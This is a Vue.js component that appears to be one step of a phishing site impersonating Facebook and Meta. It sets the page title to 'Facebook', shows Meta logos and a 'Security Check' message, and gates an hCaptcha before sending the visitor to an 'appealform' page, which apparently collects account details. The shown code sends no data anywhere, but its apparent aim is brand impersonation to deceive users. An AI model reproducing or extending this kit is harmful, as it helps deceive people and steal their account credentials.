<script>
import VueHcaptcha from '@hcaptcha/vue3-hcaptcha';

export default {
  name: "CaptchaStep",
  components: {VueHcaptcha},
  data() {
    return {
      captcha: true,
      sitekey: '',
    };
  },
  created() {
    document.title = "Facebook";
    this.sitekey = process.env.VUE_APP_SITE_KEY;
  },
  mounted() {},
  methods: {
    success() {
      this.captcha = false;
    },
    error() {
      console.log('error')
    },
    submit() {
      this.$router.push({ path: 'appealform' })
    },
  },
};
</script>

<template>
  <div>
    <div class="container h-100">
      <div class="row mt-5">
        <div style="padding:0px!important;" class="card m-auto col-12 col-md-6 align-items-center">
           <img class="card-img-top" src="../assets/images/captcha.jpeg" alt="Card image cap">
          <div class="card-body">
            <img style="height:30px;" src="../assets/images/logocolor.svg" alt="">
          </div>
          <div class="card-body text-center">
            <h3>Security Check</h3>
            <p>Meta uses security test to ensure that the people on the site are real. Please fill the security check below to continue further.</p>
          </div>
          <div class="card-body text-center">
            <vue-hcaptcha @verify="success()" @error="error()" :sitekey="sitekey"></vue-hcaptcha>
          </div>
          <div style="padding:1.5rem;" class="w-100 text-center">
            <!-- <a href="/#/appealform" :disabled="captcha" class="btn btn-primary btn-block btn-lg">Continue</a> -->
            <button type="button" :disabled="captcha" @click="submit()" class="btn btn-primary btn-block btn-lg">Continue</button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped src="../assets/css/bootstrap.min.css">
</style>
